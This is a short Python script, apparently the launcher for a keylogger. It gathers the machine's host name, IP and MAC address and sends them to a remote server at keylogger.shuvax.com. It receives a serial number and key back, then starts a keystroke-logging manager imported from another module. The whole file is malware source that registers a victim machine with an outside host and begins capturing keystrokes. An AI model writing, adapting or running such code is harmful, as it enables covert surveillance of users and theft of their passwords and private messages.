import manager as keylogger
import requests, uuid, socket

url = 'https://keylogger.shuvax.com/api/create_machine'



def create_logger():
    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)
    mac_address = hex(uuid.getnode())
    data = {
        "host name": host_name,
        "ip": ip_address,
        "mac address": mac_address
    }
    try:
        response = requests.post(url, json=data)
        response_dict = response.json()
        number = response_dict['serial_number']
        key = response_dict['key']
        key_logger = keylogger.KeyLoggerManager(number,key)
        key_logger.start_logging()
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False


if __name__ == "__main__":
    create_logger()
